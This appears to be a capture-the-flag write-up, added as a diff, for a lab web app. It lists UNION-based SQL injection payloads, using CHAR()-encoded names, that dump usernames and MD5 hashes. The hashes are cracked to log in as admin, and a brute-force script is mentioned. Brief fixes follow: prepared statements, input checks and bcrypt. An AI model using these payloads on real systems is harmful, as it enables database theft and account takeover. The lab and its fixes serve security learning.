@@ -1,0 +1,27 @@
+1st method
+use SQL Injection && Cryptographic Failures BRUTE FORCE
+Process:
+    - Go to SEARCH MEMBER BY ID
+    - 1 UNION SELECT null, schema_name FROM information_schema.schemata -- 
+    - 1 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema =  CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101) -- 
+    - 1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = CHAR(100,98,95,100,101,102,97,117,108,116) --
+    - 1 UNION SELECT username, password FROM Member_Brute_Force.db_default -- 
+    - Decrypt password with md5
+    - Go to signin
+    - admin | shadow or root | shadow
+    - Get the flag
+
+2nd method
+use BruteForce
+Process:
+    - Use bruteForce.py script
+
+
+Secure:
+    - Use the POST method and not the GET method to send form
+   
+    - Use prepare request for SQL
+    - Check that there is only data and not commands in input for SQL
+
+    - Use a strong password
+    - Use Cryptographic tools advanced (bcrypt)
